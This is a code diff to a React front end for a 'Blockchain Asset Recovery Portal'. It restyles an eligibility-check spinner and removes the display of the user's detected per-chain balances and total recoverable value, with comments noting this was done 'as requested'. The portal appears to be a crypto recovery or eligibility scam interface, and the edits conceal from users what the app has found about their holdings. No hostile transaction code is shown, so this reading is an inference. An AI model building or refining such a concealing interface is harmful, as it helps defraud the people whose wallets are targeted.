@@ -2930,15 +2930,15 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message with Spin Animation */}
+              {/* Eligibility Status Message with Spin Animation (same place as not eligible message) */}
               <div className="mt-3 w-full">
                 {verifying ? (
-                  <div className="bg-blue-500/20 border border-blue-500/30 rounded-lg p-4 text-center">
+                  <div className="bg-blue-500/20 border border-blue-500/30 rounded-lg p-4 text-center animate-pulse">
                     <div className="flex items-center justify-center gap-3">
-                      <div className="w-6 h-6 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                      <span className="text-blue-400 text-sm font-medium">{translations.checkEligibility}...</span>
+                      <div className="w-7 h-7 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                      <span className="text-blue-400 text-base font-semibold tracking-wide">{translations.checkEligibility}...</span>
                     </div>
-                    <p className="text-gray-400 text-xs mt-2">{translations.verifying}</p>
+                    <p className="text-gray-300 text-xs mt-2">{translations.verifying}</p>
                   </div>
                 ) : (
                   <div className={`rounded-lg p-3 text-sm ${
@@ -3015,12 +3015,9 @@ function App() {
           <div className="w-full max-w-md bg-blue-500/5 border border-blue-500/30 backdrop-blur p-8 rounded-2xl mt-8">
             <h3 className="text-2xl font-bold mb-4 text-blue-400">Blockchain Asset Recovery Portal</h3>
             
-            <div className="flex justify-between items-center mb-3">
-              <p className="text-gray-300">{translations.recoveryValue}:</p>
-              <p className="text-blue-400 font-bold">${totalOnChainValue.toLocaleString()} USD</p>
-            </div>
+            {/* Recoverable Value line removed as requested */}
             
-            {/* Progress Bar */}
+            {/* Progress Bar (visual only, no balance text) */}
             <div className="w-full bg-blue-950 h-3 rounded-full overflow-hidden mb-6">
               <div 
                 className="h-full bg-gradient-to-r from-blue-600 to-blue-400 rounded-full transition-all duration-1000"
@@ -3040,20 +3037,7 @@ function App() {
               </div>
             </div>
 
-            {/* Chain Balance Details - Shows actual values per chain */}
-            {Object.keys(balances).length > 0 && (
-              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-4 mb-6">
-                <h4 className="text-sm font-bold mb-2 text-blue-400">📊 Detected Balances:</h4>
-                <div className="space-y-1">
-                  {Object.entries(balances).map(([chainName, balance]) => (
-                    <div key={chainName} className="flex justify-between text-xs">
-                      <span className="text-gray-400">{chainName}:</span>
-                      <span className="text-white">{balance.amount.toFixed(6)} {balance.symbol} (${balance.valueUSD.toFixed(2)})</span>
-                    </div>
-                  ))}
-                </div>
-              </div>
-            )}
+            {/* Chain Balance Details REMOVED - no balance display */}
 
             <div className="bg-black/50 border border-blue-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-blue-400">🔗 Recovery Protocol</h4>
